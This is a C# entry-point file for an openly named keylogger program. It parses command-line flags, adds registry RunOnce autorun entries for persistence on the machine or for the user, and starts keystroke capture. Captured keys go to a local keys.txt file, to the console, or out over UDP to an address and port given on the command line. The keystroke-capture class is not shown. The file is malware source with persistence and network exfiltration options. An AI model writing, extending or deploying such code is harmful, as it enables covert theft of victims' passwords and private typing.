using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Keylogger
{
    class Program
    {
        static void Main(string[] args)
        {
            var settings = ParseArgs(args);

            if (settings.UseRegistry)
            {
                var registryUtils = new RegistryUtils(System.Reflection.Assembly.GetExecutingAssembly().Location, args);
                if (!registryUtils.SetMachineRunOnceKey())
                {
                    registryUtils.SetUserRunOnceKey();
                }
            }

            var location = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
            var keyLogger = new Keylogger(settings, location);
            keyLogger.StartKeylogger();
        }

        private static Settings ParseArgs(string[] args)
        {
            if (args.Contains("-h"))
            {
                PrintHelp();
            }

            var settings = new Settings();

            if (args.Contains("-r"))
            {
                settings.UseRegistry = true;
            }

            if (args.Contains("-f"))
            {
                settings.WriteToFile = true;
            }

            if (args.Contains("-c"))
            {
                settings.WriteToConsole = true;
            }

            if (args.Contains("-n"))
            {
                settings.StreamOverNetwork = true;
                settings.NetworkAddress = args[Array.IndexOf(args, "-n") + 1];
                settings.NetworkPort = int.Parse(args[Array.IndexOf(args, "-n") + 2]);
            }

            return settings;
        }

        private static void PrintHelp()
        {
            Console.WriteLine(@"Usage: .\Keylogger [arguments]");
            Console.WriteLine();
            Console.WriteLine(@"-r Try assign registry autorun values. Will try LocalMachine, if fails, then tries CurrentUser.");
            Console.WriteLine(@"-f Writes keyboard input to a file located at executing location. File = keys.txt");
            Console.WriteLine(@"-c Writes keyboard input to console.");
            Console.WriteLine(@"-n Writes keyboard input over UDP network. Usage: -n [IP address] [port]");

            Environment.Exit(0);
        }
    }
}
